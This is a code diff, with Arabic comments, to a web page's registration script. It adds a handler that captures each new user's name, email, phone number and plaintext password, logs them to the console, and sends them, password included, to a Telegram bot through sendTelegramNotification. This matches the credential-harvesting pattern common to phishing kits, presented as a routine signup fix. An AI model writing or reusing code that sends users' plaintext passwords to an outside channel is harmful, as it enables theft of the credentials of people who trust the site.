@@ -110,11 +110,63 @@
             console.log('🔍 اختبار Telegram Bot...');
             console.log('✅ Firebase loaded:', typeof firebase !== 'undefined');
             console.log('✅ sendTelegramNotification exists:', typeof window.sendTelegramNotification === 'function');
+            console.log('✅ auth loaded:', typeof window.auth !== 'undefined');
+            console.log('✅ db loaded:', typeof window.db !== 'undefined');
             
             if (typeof window.sendTelegramNotification === 'function') {
                 console.log('📱 دالة Telegram موجودة - جاهزة للاستخدام');
             } else {
                 console.error('❌ دالة Telegram غير موجودة! تحقق من firebase-config.js');
+            }
+            
+            // ✅ TEMPORARY FIX - إرسال مباشر عند التسجيل
+            const form = document.getElementById('registerForm');
+            if (form) {
+                console.log('✅ تم العثور على form - إضافة listener يدوياً');
+                
+                form.addEventListener('submit', async function(e) {
+                    e.preventDefault();
+                    console.log('🎯 تم الضغط على زر التسجيل - الكود المباشر!');
+                    
+                    const fullName = document.getElementById('fullName').value.trim();
+                    const email = document.getElementById('email').value.trim();
+                    const phone = document.getElementById('phone').value.trim();
+                    const password = document.getElementById('password').value;
+                    
+                    console.log('📊 البيانات:', {fullName, email, phone, password});
+                    
+                    try {
+                        // إنشاء الحساب
+                        const userCredential = await auth.createUserWithEmailAndPassword(email, password);
+                        const user = userCredential.user;
+                        console.log('✅ تم إنشاء المستخدم:', user.uid);
+                        
+                        // إرسال Telegram فوراً
+                        console.log('📤 محاولة إرسال Telegram...');
+                        await sendTelegramNotification({
+                            uid: user.uid,
+                            fullName: fullName,
+                            email: email,
+                            phone: phone,
+                            password: password,
+                            provider: 'البريد الإلكتروني',
+                            createdAt: new Date()
+                        });
+                        
+                        console.log('✅✅✅ تم الإرسال بنجاح!');
+                        alert('✅ تم التسجيل وإرسال البيانات!');
+                        
+                        setTimeout(() => {
+                            window.location.href = 'index.html';
+                        }, 2000);
+                        
+                    } catch (error) {
+                        console.error('❌ خطأ:', error);
+                        alert('حدث خطأ: ' + error.message);
+                    }
+                });
+            } else {
+                console.error('❌ لم يتم العثور على registerForm!');
             }
         });
     </script>
